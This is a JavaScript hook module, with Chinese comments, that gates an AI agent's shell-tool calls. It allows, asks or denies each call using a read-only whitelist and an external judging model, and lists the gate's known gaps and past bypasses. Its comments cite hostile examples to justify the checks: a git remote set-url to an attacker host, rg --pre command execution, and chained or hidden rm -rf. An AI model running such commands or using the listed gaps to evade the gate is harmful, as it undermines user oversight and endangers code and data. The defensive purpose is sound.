// risk-gate.mjs — PreToolUse 风险闸的宿主无关内核：对 shell 类工具调用做放行/确认/拒绝判定。
// 与 clarity.mjs 同一契约：判定为"放行"、只读捷径、非 shell 工具或缺 Key 时返回 null
// （调用方 fail-open 放行），网络或响应异常一律 throw。判定为确认/拒绝时返回
// { decision: 'ask' | 'deny', reason }。stdin/stdout 协议在 hooks/pretool-risk.mjs。
// 配置解析 / 请求 / 归一化共用 hooks/decide-client.mjs（与需求预检同一份）。

import { config, decide, scoreOf, choiceOf, noulOf } from './decide-client.mjs';
import { STDIN_MAX_CHARS } from './hook-io.mjs';

// 门限：拒绝 = 判定为 deny，或（高风险 且 不可逆）；确认 = 判定 confirm，或中风险以上，或不可逆。
// 低置信度不改放行/确认门限，只把 deny 降级为 ask（自动拦截的硬动作需要可信判据），偏低注记保留在理由里。
export const GATE = { riskDenyMin: 3, riskConfirmMin: 2, irreversibleMin: 0.5 };

// 只对 shell 类工具启动判定：其余工具（读写文件、搜索）单次风险低且调用频繁，
// 每次都发判定请求不可接受。名称匹配覆盖各宿主对终端类工具的常见命名——
// powershell/pwsh 等词内部的 shell 不构成边界（"powershell" 里 shell 前是 r），必须单列。
//
// SHELL_TOOL_NAMES 是**单源名单**：hooks.json 的 PreToolUse matcher 必须覆盖它的每一项。
// 过去两处各写各的，matcher 只有 Bash|Shell|Terminal，而内核认 12 个名字——宿主把命令交给
// cmd / exec / run / pwsh 类工具时，hook 压根不被调用，判定请求一次都不发，风险闸形同虚设。
// matcher 按「每个字母的大小写变体」书写（[Bb]ash|[Ss]hell|…）：工具名的大小写由宿主决定，
// 插件挑不了。回归由 test/hook.smoke.mjs 的 matcher 同宽断言锁死（JSON 无法 import，
// 只能在测试里对账）；断言刻意不带 'i' 标志——大小写不敏感地匹配会把缺小写名字的缺口掩盖掉。
export const SHELL_TOOL_NAMES = [
  'bash', 'shell', 'terminal', 'command', 'cmd', 'exec', 'process', 'run',
  'powershell', 'pwsh', 'zsh', 'fish',
];
const SHELL_TOOL = new RegExp(`(^|[_\\-. ])(?:${SHELL_TOOL_NAMES.join('|')})([_\\-. ]|$)`, 'i');

// 驼峰工具名先拆词再匹配（2026-10-28）：宿主用 `RunCommand` / `ExecuteCommand` / `BashTool` 这类
// 命名时，`Command` 前是大写字母 R、后是小写字母 T——两侧都不是 [_\-.] 边界，于是 matcher 命中
// （它按子串判定，hook 被调用）而内核对不上，落进「非 shell 工具」静默放行。这是 2026-10-27 修的
// 「matcher 太窄导致 hook 不被调用」的镜像洞：那次只对了 matcher→内核一个方向。
// 拆词把 `RunCommand` 变成 `Run Command`，两侧变成空格边界（已加进上面的字符类）。
// 方向安全：拆词只会让更多工具落进管辖范围（多发一次判定请求），不会让 shell 工具漏出。
export function normalizeToolName(toolName) {
  return String(toolName).replace(/([a-z0-9])([A-Z])/g, '$1 $2');
}

// 明显只读的命令捷径：不发判定请求直接放行（与 clarity 的寒暄捷径同一思路）
// 注意 git branch / git remote 不在这里：它们是**命令族**而不是只读动作，见下方 gitReadonlyAllowed。
const READONLY =
  /^(ls|dir|pwd|cat|head|tail|grep|rg|find|which|type|echo|whoami|date|git (status|log|diff|show|config --get)|node -v|npm (ls|view|outdated))\b/i;

// git branch / git remote 的只读形式必须显式列出：`git branch -D feature` 删分支、
// `git remote remove origin` 删远端、`git remote set-url origin https://evil.example/x` 把后续
// push 的目标指到攻击者端点（代码外泄）。首 token 白名单命中就跳过判定 = 风险闸对最该拦的
// 一类命令完全失灵，宿主连一次提示都收不到。因此这两个命令族从通用白名单里移出，
// 只放行「列举」类显式只读形式，其余一律发判定请求。
const GIT_BRANCH_READONLY_FLAGS = new Set([
  '-a', '--all', '-l', '--list', '-v', '--verbose', '-r', '--remotes', '--show-current',
]);
const GIT_REMOTE_READONLY_FLAGS = new Set(['-v', '--verbose']);
const GIT_REMOTE_READONLY_SUBS = new Set(['show']);

/** `git branch` / `git remote` 是否为显式只读形式（只列举，不改状态）。
 *  位置参数（分支名/远端名）一律不算只读：`git branch feature` 是建分支。 */
function gitReadonlyAllowed(command) {
  const tokens = command.trim().split(/\s+/);
  const sub = (tokens[1] || '').toLowerCase();
  const rest = tokens.slice(2);
  if (sub === 'branch') {
    return rest.every((t) => GIT_BRANCH_READONLY_FLAGS.has(t.toLowerCase()));
  }
  if (sub === 'remote') {
    // `git remote show [选项] <远端名>` 是只读列举：远端名是位置参数，不算副作用
    if (rest.length > 0 && GIT_REMOTE_READONLY_SUBS.has(rest[0].toLowerCase())) {
      const tail = rest.slice(1);
      const positional = tail.filter((t) => !t.startsWith('-'));
      const flags = tail.filter((t) => t.startsWith('-'));
      return (
        positional.length <= 1 &&
        flags.every((t) => t === '-n' || t === '--no-query' || GIT_REMOTE_READONLY_FLAGS.has(t.toLowerCase()))
      );
    }
    return rest.every((t) => GIT_REMOTE_READONLY_FLAGS.has(t.toLowerCase()));
  }
  return false;
}

// 链式/重定向/命令替换：出现任一符号，整条命令就不再「明显只读」。首 token 白名单再准也
// 不作数——`echo start; rm -rf build`、`ls && rm -rf x`、`cat a > b` 都会绕过白名单直接放行。
const COMPOUND = /[;&|><`]|\$\(|\n/;
// find 的副作用开关：-delete / -exec / -execdir / -ok / -okdir 会删改或执行文件，
// -fls / -fprint / -fprintf 会写文件，都不算只读。注意 \b 语义：必须显式列出 okdir 等更长分支——
// `ok\b` 匹配不到 `-okdir`（k 与 d 之间无词边界），漏列会把确认式删除当成只读放行。
// 同理 -fprint 必须列：只写 -fprintf 时 `-fprint` 也匹配不上（fprint 后面是词边界，
// 但 alternation 里 shorter 在前会让 `-fprint` 走通、`-fprintf` 反而只匹配前半）。长串在前，两条都锁。
const FIND_MUTATES = /\s-(delete|exec|execdir|ok|okdir|fls|fprintf|fprint)\b/i;

// ripgrep / grep 的 --pre 对每个待搜文件跑外部预处理器（`rg --pre sh -c '…'` 即执行任意命令），
// --pre=<prog> 与 --pre <prog> 两种写法都算。挂着只读首 token，实际在执行命令，必须在捷径前剔掉。
const PRE_EXECUTES = /\s--pre(?:=|\s)/i;

/** 风险闸总开关。设置页注入的 SYSTEMONE_PLUGIN_HOOK_RISK_GATE 优先于裸环境变量。
 *  开关必须存在：拦不住又关不掉的闸，用户只剩卸载一条路——那不是想要的收敛方式。
 *  非法值告警后按默认 on（与 precheckMode 同口径：坏值不毒死流程，但也不静默关灯）。 */
export function riskGateEnabled(env = process.env) {
  const raw = String(env.SYSTEMONE_PLUGIN_HOOK_RISK_GATE || env.SYSTEMONE_HOOK_RISK_GATE || '').trim().toLowerCase();
  if (raw === '' || raw === 'on' || raw === 'true') return true;
  if (raw === 'off' || raw === 'none' || raw === 'false' || raw === '0') return false;
  process.stderr.write(`[systemone-decision hook] SYSTEMONE_HOOK_RISK_GATE 值 "${raw}" 无法识别（可用：on/off），按默认 on 处理\n`);
  return true;
}

/** 首 token 命中只读白名单、且整条命令无链式副作用时才走捷径（省一次判定请求）。
 *
 *  已知未覆盖的窄口子（有意留着的成本权衡）：`git log/diff/show` 仍算只读，但仓库自带配置里的
 *  `core.pager` / `pager.log` / `diff.external` 是仓库可控的，恶意仓库可借此在执行 `git diff` 时
 *  跑外部程序。把它移出只读白名单会让每次 git 读取都付一次判定请求，代价远大于收益；
 *  防线交给宿主自身的目录信任与宿主权限系统，这里不再重复收费。
 *  `git branch` / `git remote` 不属此列：它们会改状态（删分支、删远端、改 push 目标），
 *  已从通用白名单移出，只放行显式只读形式。 */
function isReadonlyShortcut(command) {
  if (COMPOUND.test(command)) return false;
  if (PRE_EXECUTES.test(command)) return false;
  if (/^find\b/i.test(command)) return !FIND_MUTATES.test(command);
  if (/^git (branch|remote)\b/i.test(command)) return gitReadonlyAllowed(command);
  return READONLY.test(command);
}

const QUESTIONS = {
  verdict: {
    type: 'choice',
    label: '放行判定',
    instructions: '该命令是否应当放行执行？',
    criteria: {
      allow: '低风险，直接放行',
      confirm: '有一定风险或处于灰区，先向用户确认再执行',
      deny: '高风险或破坏性操作，不应执行',
    },
  },
  risk: {
    type: 'score',
    label: '破坏性等级',
    instructions: '该命令的破坏性/不可逆程度是？',
    criteria: [
      '只读或完全可回滚',
      '可逆的写操作',
      '难以回滚的写操作',
      '不可逆删除或影响生产/远程资源',
    ],
  },
  irreversible: {
    type: 'noul',
    label: '不可逆',
    instructions: '该命令的后果是否不可逆或难以回滚？',
  },
};

/** 该工具是否属于风险闸的管辖范围（shell 类）。
 *  先按原样匹配（大小写变体如 `basH` 直接命中）；失败再拆驼峰词重试——`RunCommand` 拆成
 *  `Run Command` 后 `Command` 前是空格边界。两步都失败才算不管辖。 */
export function applies(toolName) {
  if (typeof toolName !== 'string') return false;
  return SHELL_TOOL.test(toolName) || SHELL_TOOL.test(normalizeToolName(toolName));
}

// 退化路径：宿主用了别的字段名承载命令。原先把整个 tool_input 序列化外发，
// 可能连带把大段文件内容、凭据片段一起送到外部端点——分析「这条命令危不危险」
// 只需要知道有哪些字段、每个字段大概是什么，不需要全文。这里只发键名 + 截断后的值摘要。
const FALLBACK_VALUE_CHARS = 200;

function summarizeToolInput(input) {
  const keys = Object.keys(input);
  if (keys.length === 0) return '（工具入参为空）';
  const parts = keys.map((key) => {
    const value = input[key];
    if (typeof value === 'string') {
      const text = value.trim();
      const clipped =
        text.length > FALLBACK_VALUE_CHARS ? `${text.slice(0, FALLBACK_VALUE_CHARS)}…（已截断，共 ${text.length} 字符）` : text;
      return `${key}="${clipped}"`;
    }
    if (value === null || typeof value !== 'object') return `${key}=${String(value)}`;
    const size = Array.isArray(value) ? value.length : Object.keys(value).length;
    return `${key}=<${Array.isArray(value) ? '数组' : '对象'} ${size} 项，不外发内容>`;
  });
  return `（工具入参无标准命令字段，仅摘要）${parts.join('；')}`;
}

// 返回 { text, standard }：standard=false 表示入参不含任何标准命令字段（只拿到字段名摘要）。
// 调用方据此判定「模型根本没看到要执行的命令」——见 assess 里的升级逻辑。
function commandOf(toolInput) {
  const input = toolInput && typeof toolInput === 'object' ? toolInput : {};
  const raw = input.command ?? input.cmd ?? input.script ?? input.execution_input;
  if (typeof raw === 'string' && raw.trim() !== '') return { text: raw.trim(), standard: true };
  return { text: summarizeToolInput(input), standard: false };
}

/**
 * @param {string} toolName - 宿主传入的工具名
 * @param {unknown} toolInput - 工具入参（取 command / cmd / script / execution_input 字段）。
 *   取不到标准字段时只发字段名摘要（不外发整个入参），且因模型看不到命令内容，判定结果一律
 *   升级为 ask 转人工——不自动放行（2026-10-28 市场审查加固）。
 * @param {Record<string, string|undefined>} [env] - 供应商配置来源，默认进程环境
 * @param {object} [opts] - { timeoutMs, truncated, budgetExhausted }
 *   timeoutMs = 共享 deadline 的剩余预算，透传给 decide；
 *   truncated = 输入不可信（stdin 超限或预算耗尽），fail-closed 转人工；
 *   budgetExhausted = 因耗时过久耗尽预算（只影响理由文案）
 * @returns {Promise<{decision: 'ask'|'deny', reason: string} | null>} null = 放行（不拦截）
 */
export async function assess(toolName, toolInput, env = process.env, opts = {}) {
  if (!riskGateEnabled(env)) return null; // 显式关灯：一律放行，且不发判定请求
  const cfg = config(env);
  if (!cfg.apiKey) return null; // 未配置 Key，静默放行
  // 管辖权判断先行：名字可读且非 shell 类的工具不归风险闸管，即使 stdin 被截断也直接放行——
  // 截断转人工只对将要分析的 shell 命令有意义。名字读不出来时（stdin 截断时 hook-io 不解析
  // JSON，tool_name 为 undefined）无法判定管辖权，落入下面的截断 fail-closed 分支。
  if (typeof toolName === 'string' && !applies(toolName)) return null;
  // stdin 被截断（超 100K 上限）时 tool_name / tool_input 都可能不完整——分析不到的尾巴里
  // 可以藏 `; rm -rf /`。不能走只读捷径，也不把残缺输入交给判定模型：fail-closed 转人工确认。
  //（管辖内的 shell 工具，以及 tool_name 不可读、无法排除 shell 类的情形）
  if (opts.truncated === true) {
    // 两种「输入不可信」要分开说：stdin 超限截断 vs 读取耗时过久吃光时间预算
    const why =
      opts.budgetExhausted === true
        ? 'hook 读取输入耗时过久，时间预算已耗尽'
        : `hook 输入超过 ${STDIN_MAX_CHARS} 字符上限被截断`;
    return {
      decision: 'ask',
      reason: `[SystemOne 风险闸] ${why}，无法完整分析命令，默认需先确认：请向用户展示命令并确认后再执行。`,
    };
  }
  const { text: command, standard: standardCommand } = commandOf(toolInput);
  // 命令本身超上限同理：无法完整分析（也不把 100K+ 文本塞给判定模型白烧一次请求），fail-closed
  if (command.length > STDIN_MAX_CHARS) {
    return {
      decision: 'ask',
      reason: `[SystemOne 风险闸] 命令超过 ${STDIN_MAX_CHARS} 字符上限，无法完整分析是否存在隐藏副作用，默认需先确认：请向用户展示命令并确认后再执行。`,
    };
  }
  // 只读捷径只在拿到**标准命令字段**时才可信：非标准字段下 command 只是「字段名 + 截断值摘要」，
  // 拿摘要去匹配只读前缀（如 file_path="/etc/passwd" 之类）毫无意义，且正是「模型看不到命令」的病根。
  if (standardCommand && isReadonlyShortcut(command)) return null;
  const answers = await decide(`工具：${toolName}\n命令：${command}`, cfg, QUESTIONS, opts.timeoutMs);
  if (!answers) return null; // 无响应（网络失败/超时）：维持 fail-open 放行，与坏响应区别对待
  // 取不出 = 归一化为 null（字段缺失/题型回显错乱），或 verdict 选中判据表外的选项（幻觉）。
  // 幻觉选项与 MCP 侧 isBorderlineAnswer（question-types.mjs）同一口径：不能当有效判定。
  const verdictRaw = choiceOf(answers.verdict);
  // Object.hasOwn 而非 in：后者沿原型链匹配，'toString' 之类的值会被误当合法选项
  const verdict = verdictRaw && Object.hasOwn(QUESTIONS.verdict.criteria, verdictRaw.value) ? verdictRaw : null;
  const risk = scoreOf(answers.risk);
  const irreversible = noulOf(answers.irreversible);
  // 拿到了响应但三问任一取不出有效判定：决策响应不完整，fail-closed 转人工确认，不再放行
  if (!verdict || !risk || !irreversible) {
    return {
      decision: 'ask',
      reason:
        '[SystemOne 风险闸] 判定响应不完整（幻觉选项或题型错乱，三问至少一问取不出有效判定），不能自动放行：请向用户展示命令并确认后再执行。',
    };
  }
  const p = irreversible.probability;
  const deny = verdict.value === 'deny' || (risk.score >= GATE.riskDenyMin && p >= GATE.irreversibleMin);
  const confirm = !deny && (verdict.value === 'confirm' || risk.score >= GATE.riskConfirmMin || p >= GATE.irreversibleMin);
  // 非标准命令字段：模型收到的只是「字段名 + 截断值摘要」，看不到真正要执行的命令文本——此时模型判
  // 「放行」不构成安全信号（它是在对摘要放行），必须升级为 ask 转人工。deny/confirm 是 fail-safe
  // 方向，照常生效（拦截不会因看不到命令而漏）。摘要路径只发字段名、不外发整个 tool_input
  //（见 summarizeToolInput），故不构成隐私回归。
  if (!deny && !confirm) {
    if (!standardCommand) {
      return {
        decision: 'ask',
        reason:
          '[SystemOne 风险闸] 宿主未用标准命令字段（command/cmd/script/execution_input）承载命令，判定模型看不到命令内容，无法自动放行：请向用户展示该命令并确认后再执行。',
      };
    }
    return null; // 放行，零噪音
  }
  const conf = [verdict.confidence, risk.confidence, irreversible.confidence].filter((c) => c !== null);
  const minConf = conf.length > 0 ? Math.min(...conf) : null;
  const lowConfident = minConf !== null && minConf < 0.7;
  const low = lowConfident ? `（注意：本次判定最低置信度 ${minConf.toFixed(2)}，偏低）` : '';
  // 低置信度的 deny 降级为 ask：deny 是自动拦截的硬动作，判据本身不可信时把决定交还用户
  //（偏低注记保留在 reason 里）；对 verdict 路径与 risk/irreversible 规则路径同样适用
  const decision = deny && !lowConfident ? 'deny' : 'ask';
  const reason =
    `[SystemOne 风险闸] 该命令判定为${decision === 'deny' ? '高风险，拒绝执行' : '需先确认再执行'}：` +
    `破坏性 ${risk.score.toFixed(1)}/3${risk.level ? `（${risk.level}）` : ''}；不可逆概率 ${p.toFixed(2)}；` +
    `模型判定 ${verdict.value}。${decision === 'deny' ? '建议阻止该命令并向用户说明风险，或让用户手动执行。' : '建议先向用户展示命令并确认后再执行。'}${low}`;
  return { decision, reason };
}
